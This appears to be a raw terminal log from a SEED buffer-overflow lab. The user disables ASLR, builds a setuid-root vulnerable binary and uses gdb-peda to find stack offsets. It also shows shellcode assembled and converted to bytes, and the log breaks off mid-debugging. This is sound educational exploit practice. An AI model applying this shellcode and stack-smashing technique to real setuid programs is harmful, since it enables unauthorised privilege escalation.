[06/17/22]seed@VM:~/.../b2_16$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[06/17/22]seed@VM:~/.../b2_16$ sudo ln -sf /bin/zsh /bin/sh
[06/17/22]seed@VM:~/.../b2_16$ sudo su
root@VM:/home/seed/practice/b2_16# gcc -m32 -o A1 -z execstack -fno-stack-protector A1.c

root@VM:/home/seed/practice/b2_16# sudo chown root A1
root@VM:/home/seed/practice/b2_16# sudo chmod 4755 A1
root@VM:/home/seed/practice/b2_16# su seed
[06/17/22]seed@VM:~/.../b2_16$ 
[06/17/22]seed@VM:~/.../b2_16$ touch badfile
[06/17/22]seed@VM:~/.../b2_16$ gcc  -m32 -o A1_dbg -g -z execstack -fno-stack-protector A1.c
[06/17/22]seed@VM:~/.../b2_16$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x124d: file A1.c, line 25.
gdb-peda$ run
Starting program: /home/seed/practice/b2_16/A1_dbg 
Inside Main
[----------------------------------registers-----------------------------------]
EAX: 0xffffcceb --> 0x90909090 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0x0 
EDX: 0x910 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffcccc --> 0x56556386 (<main+122>:	add    esp,0x10)
EIP: 0x5655624d (<bof>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556244 <frame_dummy+4>:	jmp    0x565561a0 <register_tm_clones>
   0x56556249 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x5655624c <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x5655624d <bof>:	endbr32 
   0x56556251 <bof+4>:	push   ebp
   0x56556252 <bof+5>:	mov    ebp,esp
   0x56556254 <bof+7>:	push   ebx
   0x56556255 <bof+8>:	sub    esp,0x264
[------------------------------------stack-------------------------------------]
0000| 0xffffcccc --> 0x56556386 (<main+122>:	add    esp,0x10)
0004| 0xffffccd0 --> 0xffffcceb --> 0x90909090 
0008| 0xffffccd4 --> 0x1 
0012| 0xffffccd8 --> 0x910 
0016| 0xffffccdc --> 0x5655a1a0 --> 0xfbad2488 
0020| 0xffffcce0 --> 0x4 
0024| 0xffffcce4 --> 0x7 
0028| 0xffffcce8 --> 0x901e4a6c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (str=0xffffcceb '\220' <repeats 200 times>...) at A1.c:25
25	int bof(char *str){
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fc8 --> 0x3ed0 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0x0 
EDX: 0x910 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffccc8 --> 0xffffd608 --> 0x0 
ESP: 0xffffca60 --> 0xf7fd14f0 --> 0xbc 
EIP: 0x56556265 (<bof+24>:	sub    esp,0x8)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556255 <bof+8>:	sub    esp,0x264
   0x5655625b <bof+14>:	call   0x565563aa <__x86.get_pc_thunk.ax>
   0x56556260 <bof+19>:	add    eax,0x2d68
=> 0x56556265 <bof+24>:	sub    esp,0x8
   0x56556268 <bof+27>:	push   DWORD PTR [ebp+0x8]
   0x5655626b <bof+30>:	lea    edx,[ebp-0x25d]
   0x56556271 <bof+36>:	push   edx
   0x56556272 <bof+37>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffca60 --> 0xf7fd14f0 --> 0xbc 
0004| 0xffffca64 --> 0x16 
0008| 0xffffca68 --> 0xf7fd15d0 --> 0x74725f00 ('')
0012| 0xffffca6c --> 0xf7ffd590 --> 0xf7fd1000 --> 0x464c457f 
0016| 0xffffca70 --> 0xffffcac4 --> 0x0 
0020| 0xffffca74 --> 0xffffcac0 --> 0x80 
0024| 0xffffca78 --> 0x3 
0028| 0xffffca7c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
27	    strcpy(buffer, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffccc8
gdb-peda$ p &buffer
$2 = (char (*)[597]) 0xffffca6b
gdb-peda$ p/d 0xffffccc8 - 0xffffca6b
$3 = 605
gdb-peda$ disas foo
Dump of assembler code for function foo:
   0x565562a2 <+0>:	endbr32 
   0x565562a6 <+4>:	push   ebp
   0x565562a7 <+5>:	mov    ebp,esp
   0x565562a9 <+7>:	push   ebx
   0x565562aa <+8>:	sub    esp,0x4
   0x565562ad <+11>:	call   0x56556150 <__x86.get_pc_thunk.bx>
   0x565562b2 <+16>:	add    ebx,0x2d16
   0x565562b8 <+22>:	sub    esp,0xc
   0x565562bb <+25>:	lea    eax,[ebx-0x1fc0]
   0x565562c1 <+31>:	push   eax
   0x565562c2 <+32>:	call   0x565560e0 <puts@plt>
   0x565562c7 <+37>:	add    esp,0x10
   0x565562ca <+40>:	lea    eax,[ebx+0x40]
   0x565562d0 <+46>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565562d3 <+49>:	leave  
   0x565562d4 <+50>:	ret    
End of assembler dump.
gdb-peda$ disas bof
Dump of assembler code for function bof:
   0x5655624d <+0>:	endbr32 
   0x56556251 <+4>:	push   ebp
   0x56556252 <+5>:	mov    ebp,esp
   0x56556254 <+7>:	push   ebx
   0x56556255 <+8>:	sub    esp,0x264
   0x5655625b <+14>:	call   0x565563aa <__x86.get_pc_thunk.ax>
   0x56556260 <+19>:	add    eax,0x2d68
=> 0x56556265 <+24>:	sub    esp,0x8
   0x56556268 <+27>:	push   DWORD PTR [ebp+0x8]
   0x5655626b <+30>:	lea    edx,[ebp-0x25d]
   0x56556271 <+36>:	push   edx
   0x56556272 <+37>:	mov    ebx,eax
   0x56556274 <+39>:	call   0x565560d0 <strcpy@plt>
   0x56556279 <+44>:	add    esp,0x10
   0x5655627c <+47>:	mov    eax,0x1
   0x56556281 <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556284 <+55>:	leave  
   0x56556285 <+56>:	ret    
End of assembler dump.
gdb-peda$ b *0x56556284
Breakpoint 2 at 0x56556284: file A1.c, line 29.
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x90909090 
ECX: 0xffffd600 --> 0xffffd620 --> 0x1 
EDX: 0xffffd380 --> 0xffffd620 --> 0x1 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffccc8 --> 0x90909090 
ESP: 0xffffca60 --> 0xf7fd14f0 --> 0xbc 
EIP: 0x56556284 (<bof+55>:	leave)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556279 <bof+44>:	add    esp,0x10
   0x5655627c <bof+47>:	mov    eax,0x1
   0x56556281 <bof+52>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x56556284 <bof+55>:	leave  
   0x56556285 <bof+56>:	ret    
   0x56556286 <execute>:	endbr32 
   0x5655628a <execute+4>:	push   ebp
   0x5655628b <execute+5>:	mov    ebp,esp
[------------------------------------stack-------------------------------------]
0000| 0xffffca60 --> 0xf7fd14f0 --> 0xbc 
0004| 0xffffca64 --> 0x16 
0008| 0xffffca68 --> 0x90fd15d0 
0012| 0xffffca6c --> 0x90909090 
0016| 0xffffca70 --> 0x90909090 
0020| 0xffffca74 --> 0x90909090 
0024| 0xffffca78 --> 0x90909090 
0028| 0xffffca7c --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x56556284 in bof (
    str=0x90909090 <error: Cannot access memory at address 0x90909090>)
    at A1.c:29
29	}
gdb-peda$ p (*(unsigned*)($ebp+4))
$4 = 0xffffd259
gdb-peda$ p (*(unsigned*)($ebp+4))q
A syntax error in expression, near `q'.
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_16$ ./ exploit.py 
bash: ./: Is a directory
[06/17/22]seed@VM:~/.../b2_16$ python3 exploit.py 
[06/17/22]seed@VM:~/.../b2_16$ ./A1
Inside Main
Segmentation fault
[06/17/22]seed@VM:~/.../b2_16$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ disas execute
Dump of assembler code for function execute:
   0x00001286 <+0>:	endbr32 
   0x0000128a <+4>:	push   ebp
   0x0000128b <+5>:	mov    ebp,esp
   0x0000128d <+7>:	sub    esp,0x8
   0x00001290 <+10>:	call   0x13aa <__x86.get_pc_thunk.ax>
   0x00001295 <+15>:	add    eax,0x2d33
   0x0000129a <+20>:	mov    eax,DWORD PTR [ebp+0x8]
   0x0000129d <+23>:	call   eax
   0x0000129f <+25>:	nop
   0x000012a0 <+26>:	leave  
   0x000012a1 <+27>:	ret    
End of assembler dump.
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_16$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b foo
Breakpoint 1 at 0x12a2: file A1.c, line 35.
gdb-peda$ run
Starting program: /home/seed/practice/b2_16/A1_dbg 
Inside Main

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x2ce4 
EBX: 0x565562e5 (<bar+16>:	add    eax,0x2ce3)
ECX: 0xffffd600 --> 0xffffd620 --> 0x1 
EDX: 0xffffd380 --> 0xffffd620 --> 0x1 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0x90909090 
ESP: 0xffffccc4 --> 0x90909090 
EIP: 0x565562ed (<bar+24>:	push   DWORD PTR [ebp+0x8])
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562e0 <bar+11>:	call   0x565563aa <__x86.get_pc_thunk.ax>
   0x565562e5 <bar+16>:	add    eax,0x2ce3
   0x565562ea <bar+21>:	sub    esp,0x8
=> 0x565562ed <bar+24>:	push   DWORD PTR [ebp+0x8]
   0x565562f0 <bar+27>:	lea    edx,[eax-0x1fb5]
   0x565562f6 <bar+33>:	push   edx
   0x565562f7 <bar+34>:	mov    ebx,eax
   0x565562f9 <bar+36>:	call   0x565560b0 <printf@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffccc4 --> 0x90909090 
0004| 0xffffccc8 --> 0x90909090 
0008| 0xffffcccc --> 0xffffd360 --> 0x6850c031 
0012| 0xffffccd0 --> 0x90909090 
0016| 0xffffccd4 --> 0x90909090 
0020| 0xffffccd8 --> 0x90909090 
0024| 0xffffccdc --> 0x90909090 
0028| 0xffffcce0 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x565562ed in bar (
    x=<error reading variable: Cannot access memory at address 0x90909098>)
    at A1.c:41
41	    printf("Input Parameter %d\n",x);
gdb-peda$ b execute
Breakpoint 2 at 0x56556286: file A1.c, line 31.
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x2ce4 
EBX: 0x565562e5 (<bar+16>:	add    eax,0x2ce3)
ECX: 0xffffd600 --> 0xffffd620 --> 0x1 
EDX: 0xffffd380 --> 0xffffd620 --> 0x1 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0x90909090 
ESP: 0xffffccc4 --> 0x90909090 
EIP: 0x565562ed (<bar+24>:	push   DWORD PTR [ebp+0x8])
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562e0 <bar+11>:	call   0x565563aa <__x86.get_pc_thunk.ax>
   0x565562e5 <bar+16>:	add    eax,0x2ce3
   0x565562ea <bar+21>:	sub    esp,0x8
=> 0x565562ed <bar+24>:	push   DWORD PTR [ebp+0x8]
   0x565562f0 <bar+27>:	lea    edx,[eax-0x1fb5]
   0x565562f6 <bar+33>:	push   edx
   0x565562f7 <bar+34>:	mov    ebx,eax
   0x565562f9 <bar+36>:	call   0x565560b0 <printf@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffccc4 --> 0x90909090 
0004| 0xffffccc8 --> 0x90909090 
0008| 0xffffcccc --> 0xffffd360 --> 0x6850c031 
0012| 0xffffccd0 --> 0x90909090 
0016| 0xffffccd4 --> 0x90909090 
0020| 0xffffccd8 --> 0x90909090 
0024| 0xffffccdc --> 0x90909090 
0028| 0xffffcce0 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x565562ed in bar (
    x=<error reading variable: Cannot access memory at address 0x90909098>)
    at A1.c:41
41	    printf("Input Parameter %d\n",x);
gdb-peda$ disas execute
Dump of assembler code for function execute:
   0x56556286 <+0>:	endbr32 
   0x5655628a <+4>:	push   ebp
   0x5655628b <+5>:	mov    ebp,esp
   0x5655628d <+7>:	sub    esp,0x8
   0x56556290 <+10>:	call   0x565563aa <__x86.get_pc_thunk.ax>
   0x56556295 <+15>:	add    eax,0x2d33
   0x5655629a <+20>:	mov    eax,DWORD PTR [ebp+0x8]
   0x5655629d <+23>:	call   eax
   0x5655629f <+25>:	nop
   0x565562a0 <+26>:	leave  
   0x565562a1 <+27>:	ret    
End of assembler dump.
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_16$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b foo
Breakpoint 1 at 0x12a2: file A1.c, line 35.
gdb-peda$ run
Starting program: /home/seed/practice/b2_16/A1_dbg 
Inside Main

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x2ce4 
EBX: 0x565562e5 (<bar+16>:	add    eax,0x2ce3)
ECX: 0xffffd600 --> 0xffffd620 --> 0x1 
EDX: 0xffffd380 --> 0xffffd620 --> 0x1 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0x90909090 
ESP: 0xffffccc4 --> 0x90909090 
EIP: 0x565562ed (<bar+24>:	push   DWORD PTR [ebp+0x8])
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562e0 <bar+11>:	call   0x565563aa <__x86.get_pc_thunk.ax>
   0x565562e5 <bar+16>:	add    eax,0x2ce3
   0x565562ea <bar+21>:	sub    esp,0x8
=> 0x565562ed <bar+24>:	push   DWORD PTR [ebp+0x8]
   0x565562f0 <bar+27>:	lea    edx,[eax-0x1fb5]
   0x565562f6 <bar+33>:	push   edx
   0x565562f7 <bar+34>:	mov    ebx,eax
   0x565562f9 <bar+36>:	call   0x565560b0 <printf@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffccc4 --> 0x90909090 
0004| 0xffffccc8 --> 0x90909090 
0008| 0xffffcccc --> 0xffffd360 --> 0x6850c031 
0012| 0xffffccd0 --> 0x90909090 
0016| 0xffffccd4 --> 0x90909090 
0020| 0xffffccd8 --> 0x90909090 
0024| 0xffffccdc --> 0x90909090 
0028| 0xffffcce0 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x565562ed in bar (
    x=<error reading variable: Cannot access memory at address 0x90909098>)
    at A1.c:41
41	    printf("Input Parameter %d\n",x);
gdb-peda$ b execute
Breakpoint 2 at 0x56556286: file A1.c, line 31.
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x2ce4 
EBX: 0x565562e5 (<bar+16>:	add    eax,0x2ce3)
ECX: 0xffffd600 --> 0xffffd620 --> 0x1 
EDX: 0xffffd380 --> 0xffffd620 --> 0x1 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0x90909090 
ESP: 0xffffccc4 --> 0x90909090 
EIP: 0x565562ed (<bar+24>:	push   DWORD PTR [ebp+0x8])
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562e0 <bar+11>:	call   0x565563aa <__x86.get_pc_thunk.ax>
   0x565562e5 <bar+16>:	add    eax,0x2ce3
   0x565562ea <bar+21>:	sub    esp,0x8
=> 0x565562ed <bar+24>:	push   DWORD PTR [ebp+0x8]
   0x565562f0 <bar+27>:	lea    edx,[eax-0x1fb5]
   0x565562f6 <bar+33>:	push   edx
   0x565562f7 <bar+34>:	mov    ebx,eax
   0x565562f9 <bar+36>:	call   0x565560b0 <printf@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffccc4 --> 0x90909090 
0004| 0xffffccc8 --> 0x90909090 
0008| 0xffffcccc --> 0xffffd360 --> 0x6850c031 
0012| 0xffffccd0 --> 0x90909090 
0016| 0xffffccd4 --> 0x90909090 
0020| 0xffffccd8 --> 0x90909090 
0024| 0xffffccdc --> 0x90909090 
0028| 0xffffcce0 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x565562ed in bar (
    x=<error reading variable: Cannot access memory at address 0x90909098>)
    at A1.c:41
41	    printf("Input Parameter %d\n",x);
gdb-peda$ disas ececute
No symbol "ececute" in current context.
gdb-peda$ disas execute
Dump of assembler code for function execute:
   0x56556286 <+0>:	endbr32 
   0x5655628a <+4>:	push   ebp
   0x5655628b <+5>:	mov    ebp,esp
   0x5655628d <+7>:	sub    esp,0x8
   0x56556290 <+10>:	call   0x565563aa <__x86.get_pc_thunk.ax>
   0x56556295 <+15>:	add    eax,0x2d33
   0x5655629a <+20>:	mov    eax,DWORD PTR [ebp+0x8]
   0x5655629d <+23>:	call   eax
   0x5655629f <+25>:	nop
   0x565562a0 <+26>:	leave  
   0x565562a1 <+27>:	ret    
End of assembler dump.
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_16$ nasm -f elf32 mysh.s -o mysh.o
[06/17/22]seed@VM:~/.../b2_16$ xxd -p -c 20 mysh.o
7f454c4601010100000000000000000001000300
0100000000000000000000004000000000000000
3400000000002800050002000000000000000000
0000000000000000000000000000000000000000
0000000000000000000000000000000000000000
0000000001000000010000000600000000000000
1001000011000000000000000000000010000000
0000000007000000030000000000000000000000
3001000021000000000000000000000001000000
0000000011000000020000000000000000000000
6001000040000000040000000300000004000000
1000000019000000030000000000000000000000
a00100000f000000000000000000000001000000
00000000000000000000000031dbbba2625556ff
d350bb86625556ffd30000000000000000000000
00000000002e74657874002e7368737472746162
002e73796d746162002e73747274616200000000
0000000000000000000000000000000000000000
0000000000000000010000000000000000000000
0400f1ff00000000000000000000000003000100
08000000000000000000000010000100006d7973
682e73005f73746172740000
[06/17/22]seed@VM:~/.../b2_16$ python3 convert.py 
Length of the shellcode: 17
shellcode= (
   "\x31\xdb\xbb\xa2\x62\x55\x56\xff\xd3\x50\xbb\x86\x62\x55\x56\xff"
   "\xd3"
).encode('latin-1')
[06/17/22]seed@VM:~/.../b2_16$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b bof 
Breakpoint 1 at 0x124d: file A1.c, line 25.
gdb-peda$ run
Starting program: /home/seed/practice/b2_16/A1_dbg 
Inside Main
[----------------------------------registers-----------------------------------]
EAX: 0xffffcceb --> 0x90909090 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0x0 
EDX: 0x910 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffcccc --> 0x56556386 (<main+122>:	add    esp,0x10)
EIP: 0x5655624d (<bof>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556244 <frame_dummy+4>:	jmp    0x565561a0 <register_tm_clones>
   0x56556249 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x5655624c <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x5655624d <bof>:	endbr32 
   0x56556251 <bof+4>:	push   ebp
   0x56556252 <bof+5>:	mov    ebp,esp
   0x56556254 <bof+7>:	push   ebx
   0x56556255 <bof+8>:	sub    esp,0x264
[------------------------------------stack-------------------------------------]
0000| 0xffffcccc --> 0x56556386 (<main+122>:	add    esp,0x10)
0004| 0xffffccd0 --> 0xffffcceb --> 0x90909090 
0008| 0xffffccd4 --> 0x1 
0012| 0xffffccd8 --> 0x910 
0016| 0xffffccdc --> 0x5655a1a0 --> 0xfbad2488 
0020| 0xffffcce0 --> 0x4 
0024| 0xffffcce4 --> 0x7 
0028| 0xffffcce8 --> 0x901e4a6c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (str=0xffffcceb '\220' <repeats 200 times>...) at A1.c:25
25	int bof(char *str){
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fc8 --> 0x3ed0 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0x0 
EDX: 0x910 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffccc8 --> 0xffffd608 --> 0x0 
ESP: 0xffffca60 --> 0xf7fd14f0 --> 0xbc 
EIP: 0x56556265 (<bof+24>:	sub    esp,0x8)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556255 <bof+8>:	sub    esp,0x264
   0x5655625b <bof+14>:	call   0x565563aa <__x86.get_pc_thunk.ax>
   0x56556260 <bof+19>:	add    eax,0x2d68
=> 0x56556265 <bof+24>:	sub    esp,0x8
   0x56556268 <bof+27>:	push   DWORD PTR [ebp+0x8]
   0x5655626b <bof+30>:	lea    edx,[ebp-0x25d]
   0x56556271 <bof+36>:	push   edx
   0x56556272 <bof+37>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffca60 --> 0xf7fd14f0 --> 0xbc 
0004| 0xffffca64 --> 0x16 
0008| 0xffffca68 --> 0xf7fd15d0 --> 0x74725f00 ('')
0012| 0xffffca6c --> 0xf7ffd590 --> 0xf7fd1000 --> 0x464c457f 
0016| 0xffffca70 --> 0xffffcac4 --> 0x0 
0020| 0xffffca74 --> 0xffffcac0 --> 0x80 
0024| 0xffffca78 --> 0x3 
0028| 0xffffca7c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
27	    strcpy(buffer, str);
gdb-peda$ p &buffer
$1 = (char (*)[597]) 0xffffca6b
gdb-peda$ p $ebp
$2 = (void *) 0xffffccc8
gdb-peda$ p/d 0xffffccc8 - 0xffffca6b
$3 = 605
gdb-peda$ disas bof
Dump of assembler code for function bof:
   0x5655624d <+0>:	endbr32 
   0x56556251 <+4>:	push   ebp
   0x56556252 <+5>:	mov    ebp,esp
   0x56556254 <+7>:	push   ebx
   0x56556255 <+8>:	sub    esp,0x264
   0x5655625b <+14>:	call   0x565563aa <__x86.get_pc_thunk.ax>
   0x56556260 <+19>:	add    eax,0x2d68
=> 0x56556265 <+24>:	sub    esp,0x8
   0x56556268 <+27>:	push   DWORD PTR [ebp+0x8]
   0x5655626b <+30>:	lea    edx,[ebp-0x25d]
   0x56556271 <+36>:	push   edx
   0x56556272 <+37>:	mov    ebx,eax
   0x56556274 <+39>:	call   0x565560d0 <strcpy@plt>
   0x56556279 <+44>:	add    esp,0x10
   0x5655627c <+47>:	mov    eax,0x1
   0x56556281 <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556284 <+55>:	leave  
   0x56556285 <+56>:	ret    
End of assembler dump.
gdb-peda$ b *0x56556284
Breakpoint 2 at 0x56556284: file A1.c, line 29.
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x90909090 
ECX: 0xffffd600 --> 0xffffd620 --> 0x1 
EDX: 0xffffd380 --> 0xffffd620 --> 0x1 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffccc8 --> 0x90909090 
ESP: 0xffffca60 --> 0xf7fd14f0 --> 0xbc 
EIP: 0x56556284 (<bof+55>:	leave)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556279 <bof+44>:	add    esp,0x10
   0x5655627c <bof+47>:	mov    eax,0x1
   0x56556281 <bof+52>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x56556284 <bof+55>:	leave  
   0x56556285 <bof+56>:	ret    
   0x56556286 <execute>:	endbr32 
   0x5655628a <execute+4>:	push   ebp
   0x5655628b <execute+5>:	mov    ebp,esp
[------------------------------------stack-------------------------------------]
0000| 0xffffca60 --> 0xf7fd14f0 --> 0xbc 
0004| 0xffffca64 --> 0x16 
0008| 0xffffca68 --> 0x90fd15d0 
0012| 0xffffca6c --> 0x90909090 
0016| 0xffffca70 --> 0x90909090 
0020| 0xffffca74 --> 0x90909090 
0024| 0xffffca78 --> 0x90909090 
